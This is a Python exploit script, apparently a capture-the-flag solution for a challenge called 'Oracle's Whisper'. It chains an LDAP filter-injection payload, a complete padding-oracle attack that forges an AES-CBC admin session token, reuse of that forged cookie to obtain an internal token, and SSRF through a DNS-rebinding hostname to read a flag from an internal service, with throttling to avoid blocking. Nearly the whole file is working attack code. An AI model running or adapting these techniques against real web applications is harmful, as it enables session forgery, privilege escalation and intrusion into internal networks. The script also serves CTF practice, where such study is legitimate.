#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import base64
import os
import sys
import time
import json

BASE = sys.argv[1] if len(sys.argv) > 1 \
    else "http://39.105.213.28:12605"
BS = 16  # AES块大小


# ====== 阶段1: LDAP信息发现（仅供展示）======

def ldap_breakout():
    """通过uid参数进行LDAP Breakout注入"""
    r = requests.get(
        f"{BASE}/api/users/search?uid=*%29%29%28%7C%28uid%3D*",
        timeout=10
    )
    data = r.json()
    print(f"[LDAP] Filter: {data.get('filter')}")
    entries = data.get("entries", [])
    print(f"[LDAP] 发现 {len(entries)} 条记录")
    for e in entries:
        print(f"  uid={e.get('uid')} role={e.get('role')}")
    return entries


# ====== 阶段2: Padding Oracle 伪造Token ======

def oracle(token_blob):
    """Padding Oracle: 返回True表示填充有效"""
    token = base64.urlsafe_b64encode(token_blob)\
        .decode().rstrip("=")
    try:
        r = requests.post(
            f"{BASE}/api/session/decrypt",
            json={"token": token},
            timeout=10
        )
        return "padding" not in r.text.lower()
    except:
        return False


def discover_d(C):
    """通过Padding Oracle发现AES中间值D"""
    D = bytearray(BS)
    for pad in range(1, BS + 1):
        idx = BS - pad
        ok = False
        for guess in range(256):
            forged = bytearray(BS)
            for j in range(idx + 1, BS):
                forged[j] = D[j] ^ pad
            forged[idx] = guess
            if oracle(bytes(forged) + C):
                if pad == 1:
                    # 误报检测: 翻转字节0验证是否为真实0x01填充
                    test = bytearray(forged)
                    test[0] ^= 1
                    if oracle(bytes(test) + C):
                        D[idx] = guess ^ pad
                        ok = True
                        break
                else:
                    D[idx] = guess ^ pad
                    ok = True
                    break
        if not ok:
            raise Exception(f"发现失败 pad={pad}")
        sys.stdout.write(f"\r  Oracle进度: {pad}/{BS}")
        sys.stdout.flush()
        time.sleep(0.15)  # 限速防封
    print()
    return bytes(D)


def forge_token(payload):
    """自加密: 构造解密后为payload的token"""
    pt = payload.encode()
    pl = BS - (len(pt) % BS)
    pt_padded = pt + bytes([pl]) * pl
    blocks = [pt_padded[i:i+BS]
              for i in range(0, len(pt_padded), BS)]
    n = len(blocks)
    cblocks = [None] * n
    cblocks[-1] = os.urandom(BS)
    for i in range(n - 1, -1, -1):
        D = discover_d(cblocks[i])
        if i > 0:
            cblocks[i-1] = bytes(
                D[j] ^ blocks[i][j] for j in range(BS))
        else:
            IV = bytes(
                D[j] ^ blocks[i][j] for j in range(BS))
    blob = IV + b"".join(cblocks)
    return base64.urlsafe_b64encode(blob)\
        .decode().rstrip("=")


# ====== 阶段3: 提取Profile ======

def get_profile(token):
    """用伪造session cookie获取admin profile"""
    r = requests.get(
        f"{BASE}/api/profile",
        cookies={"session": token},
        timeout=10
    )
    if r.status_code == 200:
        return r.json()
    return None


# ====== 阶段4: SSRF + DNS Rebinding ======

def ssrf_get_flag(internal_token, max_attempts=30):
    """通过DNS Rebinding SSRF访问内部服务获取flag"""
    target = (
        "http://7f000001.01010101.rbndr.us:6000"
        "/cache/template?name=/flag"
    )
    for attempt in range(1, max_attempts + 1):
        try:
            r = requests.post(
                f"{BASE}/api/webhook/test",
                json={
                    "url": target,
                    "method": "GET",
                    "headers": {
                        "X-Internal-Token": internal_token
                    }
                },
                timeout=15
            )
            if r.status_code == 200:
                body = r.json().get("body", "")
                if "ISCC" in body:
                    return body
        except:
            pass
        time.sleep(0.5)
    return None


def main():
    print("=" * 56)
    print("Oracle's Whisper 完整利用链")
    print(f"目标: {BASE}")
    print("=" * 56)

    # 阶段1: LDAP发现
    print("\n[阶段1] LDAP Breakout注入...")
    ldap_breakout()

    # 阶段2: 伪造admin token
    print("\n[阶段2] Padding Oracle伪造Admin Token...")
    token = forge_token('{"user":"oracle","role":"admin"}')
    print(f"  Token: {token[:64]}...")

    # 阶段3: 获取internal_token
    print("\n[阶段3] 获取Admin Profile...")
    profile = get_profile(token)
    if not profile:
        print("  认证失败")
        sys.exit(1)
    print(f"  Profile: {json.dumps(profile, indent=2, ensure_ascii=False)}")

    internal_token = profile.get("internal_token")
    if not internal_token:
        print("  未找到internal_token")
        sys.exit(1)

    # 阶段4: SSRF获取flag
    print("\n[阶段4] SSRF + DNS Rebinding...")
    flag_data = ssrf_get_flag(internal_token)
    if flag_data:
        print(f"  响应: {flag_data}")
        try:
            parsed = json.loads(flag_data)
            flag = parsed.get("content", "")
        except:
            flag = flag_data
        print("\n" + "=" * 56)
        print(f"FLAG: {flag}")
        print("=" * 56)
    else:
        print("  获取flag失败，可能DNS未命中，重新运行脚本即可")


if __name__ == "__main__":
    main()
